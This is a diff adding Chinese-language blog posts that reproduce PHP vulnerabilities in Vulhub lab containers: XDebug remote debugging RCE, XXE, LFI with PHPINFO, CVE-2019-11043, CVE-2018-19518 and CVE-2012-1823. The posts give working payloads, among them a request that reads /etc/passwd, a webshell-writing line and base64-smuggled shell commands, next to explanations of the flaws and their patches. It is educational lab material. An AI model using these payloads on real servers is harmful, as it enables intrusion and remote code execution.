@@ -17,6 +17,343 @@
       </tags>
   </entry>
   <entry>
+    <title>XDebug 远程调试漏洞（代码执行）</title>
+    <url>/2021/12/06/XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="XDebug-远程调试漏洞（代码执行）"><a href="#XDebug-远程调试漏洞（代码执行）" class="headerlink" title="XDebug 远程调试漏洞（代码执行）"></a>XDebug 远程调试漏洞（代码执行）</h1><p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xdebug.remote_connect_back &#x3D; 1</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br></pre></td></tr></table></figure>
+
+<p>这个配置下，我们访问<code>http://target/index.php?XDEBUG_SESSION_START=phpstorm</code>，目标服务器的XDebug将会连接访问者的IP（或<code>X-Forwarded-For</code>头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。</p>
+<p>更多说明可参考：</p>
+<ul>
+<li>[<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface]" target="_blank" rel="noopener">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface]</a>(<a href="https://ricterz.me/posts/Xdebug%3A" target="_blank" rel="noopener">https://ricterz.me/posts/Xdebug%3A</a> A Tiny Attack Surface)</li>
+<li><a href="https://xdebug.org/" target="_blank" rel="noopener">https://xdebug.org</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>启动完成后，访问<code>http://192.168.44.132:8080/</code>即可发现主页是一个简单的phpinfo，在其中可以找到xdebug的配置，可见开启了远程调试。</p>
+<p><img src="https://image.3001.net/images/20211206/16387885946725.png" alt="image-20211206172911961"></p>
+<p>因为需要使用dbgp协议与目标服务器通信，所以无法用http协议复现漏洞。</p>
+<p>我编写了一个<a href="https://github.com/vulhub/vulhub/blob/master/php/xdebug-rce/exp.py" target="_blank" rel="noopener">漏洞复现脚本</a>，指定目标web地址、待执行的php代码即可：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 要求用python3并安装requests库</span><br><span class="line">python3 exp.py -t http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;index.php -c &#39;shell_exec(&#39;id&#39;);&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211206/16387885962460.png" alt="image-20211206173537713"></p>
+<p><strong>重要说明：因为该通信是一个反向连接的过程，exp.py启动后其实是会监听本地的9000端口（可通过-l参数指定）并等待XDebug前来连接，所以执行该脚本的服务器必须有外网IP（或者与目标服务器处于同一内网）。</strong></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP环境 XML外部实体注入漏洞（XXE）</title>
+    <url>/2021/12/06/PHP%E7%8E%AF%E5%A2%83%20XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88XXE%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="PHP环境-XML外部实体注入漏洞（XXE）"><a href="#PHP环境-XML外部实体注入漏洞（XXE）" class="headerlink" title="PHP环境 XML外部实体注入漏洞（XXE）"></a>PHP环境 XML外部实体注入漏洞（XXE）</h1><p>环境介绍：</p>
+<ul>
+<li>PHP 7.0.30</li>
+<li>libxml 2.8.0</li>
+</ul>
+<p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080/index.php</code>即可看到phpinfo，搜索libxml即可看到其版本为2.8.0。</p>
+<p>Web目录为<code>./www</code>，其中包含4个文件：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── dom.php # 示例：使用DOMDocument解析body</span><br><span class="line">├── index.php</span><br><span class="line">├── SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</span><br><span class="line">└── simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</span><br></pre></td></tr></table></figure>
+
+<p><code>dom.php</code>、<code>SimpleXMLElement.php</code>、<code>simplexml_load_string.php</code>均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。</p>
+<p>简单的 XXE 有效载荷：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<p><img src="https://image.3001.net/images/20211206/16387885481719.png" alt="image-20211123164935117"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP 本地文件包含 RCE 与 PHPINFO</title>
+    <url>/2021/12/05/PHP%20%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20RCE%20%E4%B8%8E%20PHPINFO/</url>
+    <content><![CDATA[<h1 id="PHP-本地文件包含-RCE-与-PHPINFO"><a href="#PHP-本地文件包含-RCE-与-PHPINFO" class="headerlink" title="PHP 本地文件包含 RCE 与 PHPINFO"></a>PHP 本地文件包含 RCE 与 PHPINFO</h1><p>在PHP文件包含漏洞中，当我们找不到一个有效的文件来包含触发RCE时，如果存在PHPINFO可以告诉我们临时文件的随机生成的文件名及其位置，我们可能能够包含一个临时文件来利用它.</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf" target="_blank" rel="noopener">https://dl.packetstormsecurity.net/papers/general/LFI_With_PHPInfo_Assitance.pdf</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞利用细节"><a href="#漏洞利用细节" class="headerlink" title="漏洞利用细节"></a>漏洞利用细节</h2><p>目标环境是最新的PHP 7.2，这告诉我们无论版本如何，都存在此漏洞。</p>
+<p>环境启动后，访问<code>http://192.168.44.132:8080/phpinfo.php</code>获取PHPINFO页面，<code>http://192.168.44.132:8080/lfi.php?file=/etc/passwd</code>显示存在LFI漏洞。</p>
+<p>当向 PHP 发送 POST 请求并且该请求包含一个 FILE 块时，PHP 会将发布的文件保存到一个临时文件中（通常为<code>/tmp/php[6 random digits]</code>），文件名可以在<code>$_FILES</code>变量中找到。请求结束后，此临时文件将被删除。</p>
+<p>同时，PHPINFO 页面会打印上下文中的所有变量，包括<code>$_FILES</code>. 因此，如果我们将 POST 请求发送到 PHPINFO 页面，则可以在响应中找到临时文件的名称。</p>
+<p>通过这种方式，LFI 漏洞可以在没有可用的本地文件的情况下升级为 RCE。</p>
+<p>文件包含和 PHPINFO 通常位于不同的网页中。理论上，我们需要在PHPINFO页面的文件上传请求的响应中检索到文件名后将文件名发送到文件包含页面。但是，在第一个请求完成后，该文件将从磁盘中删除，因此我们需要赢得比赛。</p>
+<p>脚步：</p>
+<ol>
+<li>将文件上传请求发送到 PHPINFO 页面，其中 HEADER 和 GET 字段填充了大量垃圾数据。</li>
+<li>响应内容会很大，因为 PHPINFO 会打印出所有数据。</li>
+<li>PHP 的默认输出缓冲区大小是 4096 字节。可以理解为PHP在一次socket连接过程中每次返回4096字节。</li>
+<li>所以我们使用原始套接字来实现我们的目标。每次我们读取 4096 个字节并将文件名发送到 LFI 页面。</li>
+<li>当我们得到文件名时，第一个套接字连接还没有结束，这意味着临时文件在那个时候仍然存在。</li>
+<li>通过利用时间间隔，可以包含和执行临时文件。</li>
+</ol>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>python脚本<a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py" target="_blank" rel="noopener">exp.py</a>实现了上述过程。成功包含临时文件后，<code>&lt;?php file_put_contents(&#39;/tmp/g&#39;, &#39;&lt;?=eval($_REQUEST[1])?&gt;&#39;)?&gt;</code>将执行以生成永久文件<code>/tmp/g</code>以供进一步使用。</p>
+<p>使用python2：<code>python exp.py 192.168.44.132 8080 100</code>:</p>
+<p><img src="https://image.3001.net/images/20211206/16387885045852.png" alt="image-20211123163228927"></p>
+<p>脚本在第10个数据包成功，之后可以执行任意代码：</p>
+<p><img src="https://image.3001.net/images/20211206/16387885072574.png" alt="image-20211123163428158"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP-FPM 远程命令执行 (CVE-2019-11043)</title>
+    <url>/2021/12/05/PHP-FPM%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20(CVE-2019-11043)/</url>
+    <content><![CDATA[<h1 id="PHP-FPM-远程命令执行-CVE-2019-11043"><a href="#PHP-FPM-远程命令执行-CVE-2019-11043" class="headerlink" title="PHP-FPM 远程命令执行 (CVE-2019-11043)"></a>PHP-FPM 远程命令执行 (CVE-2019-11043)</h1><p>在 Real World CTF 2019 Quals 中发现了一个 PHP 远程代码执行 0-Day。</p>
+<blockquote>
+<p>Real World CTF 2019 Quals 是由长亭科技在中国举办的 CTF 挑战赛。</p>
+</blockquote>
+<p>参考：</p>
+<ul>
+<li><a href="https://bugs.php.net/bug.php?id=78599" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78599</a></li>
+<li><a href="https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/" target="_blank" rel="noopener">https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/</a></li>
+<li><a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phuip-fpizdam</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，可以在 处看到默认页面<code>http://192.168.44.132:8080/index.php</code>。</p>
+<p>使用此工具重现漏洞，需要高版本的go，<a href="https://github.com/neex/phuip-fpizdam" target="_blank" rel="noopener">https://github.com/neex/phiip-fpizdam</a>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;neex&#x2F;phuip-fpizdam.git</span><br><span class="line">cd phuip-fpizdam</span><br><span class="line">go get -v &amp;&amp; go build</span><br></pre></td></tr></table></figure>
+
+<p>运行执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go run . &quot;http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;index.php&quot;</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:00 Base status code is 200</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:00 Status code 502 for qsl&#x3D;1795, adding as a candidate</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:00 The target is probably vulnerable. Possible QSLs: [1785 1790 1795]</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:02 Attack params found: --qsl 1790 --pisos 152 --skip-detect</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:02 Trying to set &quot;session.auto_start&#x3D;0&quot;...</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:02 Detect() returned attack params: --qsl 1790 --pisos 152 --skip-detect &lt;-- REMEMBER THIS</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:02 Performing attack using php.ini settings...</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:02 Success! Was able to execute a command by appending &quot;?a&#x3D;&#x2F;bin&#x2F;sh+-c+&#39;which+which&#39;&amp;&quot; to URLs</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:02 Trying to cleanup &#x2F;tmp&#x2F;a...</span><br><span class="line">2019&#x2F;10&#x2F;23 19:41:02 Done!</span><br></pre></td></tr></table></figure>
+
+<p>有东西表明该过程已成功完成：</p>
+<p><img src="https://image.3001.net/images/20211206/16387884589571.png" alt="image-20211123113254571"></p>
+<p>PHP-FPM后台写了一个webshell，访问<code>http://192.168.44.132/index.php?a=id</code>触发RCE：</p>
+<p><img src="https://image.3001.net/images/20211206/16387884607856.png" alt="image-20211123113326192"></p>
+<p>您应该注意到只有部分 PHP-FPM 子进程受到污染，因此请多尝试几次执行该命令。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP imap 远程命令执行漏洞（CVE-2018-19518）</title>
+    <url>/2021/12/05/PHP%20imap%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-19518%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="PHP-imap-远程命令执行漏洞（CVE-2018-19518）"><a href="#PHP-imap-远程命令执行漏洞（CVE-2018-19518）" class="headerlink" title="PHP imap 远程命令执行漏洞（CVE-2018-19518）"></a>PHP imap 远程命令执行漏洞（CVE-2018-19518）</h1><p>php imap扩展用于在PHP中执行邮件收发操作。其<code>imap_open</code>函数会调用rsh来连接远程shell，而debian/ubuntu中默认使用ssh来代替rsh的功能（也就是说，在debian系列系统中，执行rsh命令实际执行的是ssh命令）。</p>
+<p>因为ssh命令中可以通过设置<code>-oProxyCommand=</code>来调用第三方命令，攻击者通过注入注入这个参数，最终将导致命令执行漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://bugs.php.net/bug.php?id=77153" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=77153</a></li>
+<li><a href="https://github.com/Bo0oM/PHP_imap_open_exploit" target="_blank" rel="noopener">https://github.com/Bo0oM/PHP_imap_open_exploit</a></li>
+<li><a href="https://antichat.com/threads/463395/#post-4254681" target="_blank" rel="noopener">https://antichat.com/threads/463395/#post-4254681</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-19518" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2018-19518</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>即可查看web页面。Web功能是测试一个邮件服务器是否能够成功连接，需要填写服务器地址、用户名和密码。</p>
+<p>目标源码在<a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/www/index.php" target="_blank" rel="noopener">index.php</a></p>
+<p>发送如下数据包即可成功执行命令<code>echo &#39;1234567890&#39;&gt;/tmp/test0001</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 125</span><br><span class="line"></span><br><span class="line">hostname&#x3D;x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh&#125;&amp;username&#x3D;111&amp;password&#x3D;222</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211206/16387884182483.png" alt="image-20211117170721633"></p>
+<p>执行<code>docker-compose exec web bash</code>进入容器，可见<code>/tmp/test0001</code>已成功创建：</p>
+<p><img src="https://image.3001.net/images/20211206/16387884201456.png" alt="image-20211117170753328"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</title>
+    <url>/2021/12/05/PHP-CGI%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2012-1823%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="PHP-CGI远程代码执行漏洞（CVE-2012-1823）"><a href="#PHP-CGI远程代码执行漏洞（CVE-2012-1823）" class="headerlink" title="PHP-CGI远程代码执行漏洞（CVE-2012-1823）"></a>PHP-CGI远程代码执行漏洞（CVE-2012-1823）</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
+<li>参考文章 <a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a></li>
+<li>影响版本 php &lt; 5.3.12 or php &lt; 5.4.2</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080/</code>可见“Hello”字样。</p>
+<p>访问<code>http://192.168.44.132:8080/index.php?-s</code>即爆出源码，说明漏洞存在。</p>
+<p><img src="https://image.3001.net/images/20211206/16387883625185.png" alt="image-20211117165330406"></p>
+<p>发送如下数据包，可见Body中的代码已被执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a&#x2F;&#x2F;input HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line"></span><br><span class="line">&lt;?php echo shell_exec(&quot;id&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211206/16387883648247.png" alt="image-20211117165537001"></p>
+<h2 id="漏洞解读"><a href="#漏洞解读" class="headerlink" title="漏洞解读"></a>漏洞解读</h2><h3 id="PHP-SAPI-与运行模式"><a href="#PHP-SAPI-与运行模式" class="headerlink" title="PHP SAPI 与运行模式"></a>PHP SAPI 与运行模式</h3><p>首先，介绍一下PHP的运行模式。</p>
+<p>下载PHP源码，可以看到其中有个目录叫sapi。sapi在PHP中的作用，类似于一个消息的“传递者”，比如我在《<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a>》一文中介绍的fpm，他的作用就是接受Web容器通过fastcgi协议封装好的数据，并交给PHP解释器执行。</p>
+<p>除了fpm，最常见的sapi应该是用于Apache的mod_php，这个sapi用于php和apache之间的数据交换。</p>
+<p>php-cgi也是一个sapi。在远古的时候，web应用的运行方式很简单，web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了。基于bash、perl等语言的web应用多半都是以这种方式来执行，这种执行方式一般就被称为cgi，在安装Apache的时候默认有一个cgi-bin目录，最早就是放置这些cgi脚本用的。</p>
+<p>但cgi模式有个致命的缺点，众所周知，进程的创建和调度都是有一定消耗的，而且进程的数量也不是无限的。所以，基于cgi模式运行的网站通常不能同时接受大量请求，否则每个请求生成一个子进程，就有可能把服务器挤爆。于是后来就有了fastcgi，fastcgi进程可以将自己一直运行在后台，并通过fastcgi协议接受数据包，执行后返回结果，但自身并不退出。</p>
+<p>php有一个叫php-cgi的sapi，php-cgi有两个功能，一是提供cgi方式的交互，二是提供fastcgi方式的交互。也就说，我们可以像perl一样，让web容器直接fork一个php-cgi进程执行某脚本；也可以在后台运行<code>php-cgi -b 127.0.0.1:9000</code>（php-cgi作为fastcgi的管理器），并让web容器用fastcgi协议和9000交互。</p>
+<p>那我之前说的fpm又是什么呢？为什么php有两个fastcgi管理器？php确实有两个fastcgi管理器，php-cgi可以以fastcgi模式运行，fpm也是以fastcgi模式运行。但fpm是php在5.3版本以后引入的，是一个更高效的fastcgi管理器，其诸多优点我就不多说了，可以自己去翻翻源码。因为fpm优点更多，所以现在越来越多的web应用使用php-fpm去运行php。</p>
+<h3 id="历史成因"><a href="#历史成因" class="headerlink" title="历史成因"></a>历史成因</h3><p>回到本漏洞。CVE-2012-1823就是php-cgi这个sapi出现的漏洞，我上面介绍了php-cgi提供的两种运行方式：cgi和fastcgi，本漏洞只出现在以cgi模式运行的php中。</p>
+<p>这个漏洞简单来说，就是用户请求的querystring被作为了php-cgi的参数，最终导致了一系列结果。</p>
+<p>探究一下原理，<a href="http://www.ietf.org/rfc/rfc3875" target="_blank" rel="noopener">RFC3875</a>中规定，当querystring中不包含没有解码的<code>=</code>号的情况下，要将querystring作为cgi的参数传入。所以，Apache服务器按要求实现了这个功能。</p>
+<p>但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。但在2004年的时候某个开发者发表过这么一段言论：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">From: Rasmus Lerdorf &lt;rasmus &lt;at&gt; lerdorf.com&gt;</span><br><span class="line">Subject: [PHP-DEV] php-cgi command line switch memory check</span><br><span class="line">Newsgroups: gmane.comp.php.devel</span><br><span class="line">Date: 2004-02-04 23:26:41 GMT (7 years, 49 weeks, 3 days, 20 hours and 39 minutes ago)</span><br><span class="line"></span><br><span class="line">In our SAPI cgi we have a check along these lines:</span><br><span class="line"></span><br><span class="line">    if (getenv(&quot;SERVER_SOFTWARE&quot;)</span><br><span class="line">        || getenv(&quot;SERVER_NAME&quot;)</span><br><span class="line">        || getenv(&quot;GATEWAY_INTERFACE&quot;)</span><br><span class="line">        || getenv(&quot;REQUEST_METHOD&quot;)) &#123;</span><br><span class="line">        cgi &#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!cgi) getopt(...)</span><br><span class="line"></span><br><span class="line">As in, we do not parse command line args for the cgi binary if we are </span><br><span class="line">running in a web context.  At the same time our regression testing system </span><br><span class="line">tries to use the cgi binary and it sets these variables in order to </span><br><span class="line">properly test GET&#x2F;POST requests.  From the regression testing system we </span><br><span class="line">use -d extensively to override ini settings to make sure our test </span><br><span class="line">environment is sane.  Of course these two ideas conflict, so currently our </span><br><span class="line">regression testing is somewhat broken.  We haven&#39;t noticed because we </span><br><span class="line">don&#39;t have many tests that have GET&#x2F;POST data and we rarely build the cgi </span><br><span class="line">binary.</span><br><span class="line"></span><br><span class="line">The point of the question here is if anybody remembers why we decided not </span><br><span class="line">to parse command line args for the cgi version?  I could easily see it </span><br><span class="line">being useful to be able to write a cgi script like:</span><br><span class="line"></span><br><span class="line">  #!&#x2F;usr&#x2F;local&#x2F;bin&#x2F;php-cgi -d include_path&#x3D;&#x2F;path</span><br><span class="line">  &lt;?php</span><br><span class="line">      ...</span><br><span class="line">  ?&gt;</span><br><span class="line"></span><br><span class="line">and have it work both from the command line and from a web context.</span><br><span class="line"></span><br><span class="line">As far as I can tell this wouldn&#39;t conflict with anything, but somebody at </span><br><span class="line">some point must have had a reason for disallowing this.</span><br><span class="line"></span><br><span class="line">-Rasmus</span><br></pre></td></tr></table></figure>
+
+<p>显然，这位开发者是为了方便使用类似<code>#!/usr/local/bin/php-cgi -d include_path=/path</code>的写法来进行测试，认为不应该限制php-cgi接受命令行参数，而且这个功能不和其他代码有任何冲突。</p>
+<p>于是，<code>if(!cgi) getopt(...)</code>被删掉了。</p>
+<p>但显然，根据RFC中对于command line的说明，命令行参数不光可以通过<code>#!/usr/local/bin/php-cgi -d include_path=/path</code>的方式传入php-cgi，更可以通过querystring的方式传入。</p>
+<p>这就是本漏洞的历史成因。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>那么，可控命令行参数，能做些什么事。</p>
+<p>通过阅读源码，我发现cgi模式下有如下一些参数可用：</p>
+<ul>
+<li><code>-c</code> 指定php.ini文件的位置</li>
+<li><code>-n</code> 不要加载php.ini文件</li>
+<li><code>-d</code> 指定配置项</li>
+<li><code>-b</code> 启动fastcgi进程</li>
+<li><code>-s</code> 显示文件源码</li>
+<li><code>-T</code> 执行指定次该文件</li>
+<li><code>-h</code>和<code>-?</code> 显示帮助</li>
+</ul>
+<p>最简单的利用方式，当然就是<code>-s</code>，可以直接显示源码。</p>
+<p>但阅读过我写的fastcgi那篇文章的同学应该很快就想到了一个更好的利用方法：通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：</p>
+<p>注意，空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。</p>
+<h3 id="CVE-2012-2311"><a href="#CVE-2012-2311" class="headerlink" title="CVE-2012-2311"></a>CVE-2012-2311</h3><p>这个漏洞被爆出来以后，PHP官方对其进行了修补，发布了新版本5.4.2及5.3.12，但这个修复是不完全的，可以被绕过，进而衍生出CVE-2012-2311漏洞。</p>
+<p>PHP的修复方法是对<code>-</code>进行了检查：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(query_string = getenv(<span class="string">"QUERY_STRING"</span>)) &#123;</span><br><span class="line">    decoded_query_string = strdup(query_string);</span><br><span class="line">    php_url_decode(decoded_query_string, <span class="built_in">strlen</span>(decoded_query_string));</span><br><span class="line">    <span class="keyword">if</span>(*decoded_query_string == <span class="string">'-'</span> &amp;&amp; <span class="built_in">strchr</span>(decoded_query_string, <span class="string">'='</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        skip_getopt = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(decoded_query_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可见，获取querystring后进行解码，如果第一个字符是<code>-</code>则设置skip_getopt，也就是不要获取命令行参数。</p>
+<p>这个修复方法不安全的地方在于，如果运维对php-cgi进行了一层封装的情况下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">exec &#x2F;usr&#x2F;local&#x2F;bin&#x2F;php-cgi $*</span><br></pre></td></tr></table></figure>
+
+<p>通过使用空白符加<code>-</code>的方式，也能传入参数。这时候querystring的第一个字符就是空白符而不是<code>-</code>了，绕过了上述检查。</p>
+<p>于是，php5.4.3和php5.3.13中继续进行修改:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>((query_string = getenv(<span class="string">"QUERY_STRING"</span>)) != <span class="literal">NULL</span> &amp;&amp; <span class="built_in">strchr</span>(query_string, <span class="string">'='</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">/* we've got query string that has no = - apache CGI will pass it to command line */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *p;</span><br><span class="line">    decoded_query_string = strdup(query_string);</span><br><span class="line">    php_url_decode(decoded_query_string, <span class="built_in">strlen</span>(decoded_query_string));</span><br><span class="line">    <span class="keyword">for</span> (p = decoded_query_string; *p &amp;&amp;  *p &lt;= <span class="string">' '</span>; p++) &#123;</span><br><span class="line">        <span class="comment">/* skip all leading spaces */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(*p == <span class="string">'-'</span>) &#123;</span><br><span class="line">        skip_getopt = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(decoded_query_string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先跳过所有空白符（小于等于空格的所有字符），再判断第一个字符是否是<code>-</code>。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>php</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PHP 8.1.0-dev User-Agentt 后门</title>
+    <url>/2021/12/05/PHP%208.1.0-dev%20User-Agentt%20%E5%90%8E%E9%97%A8/</url>
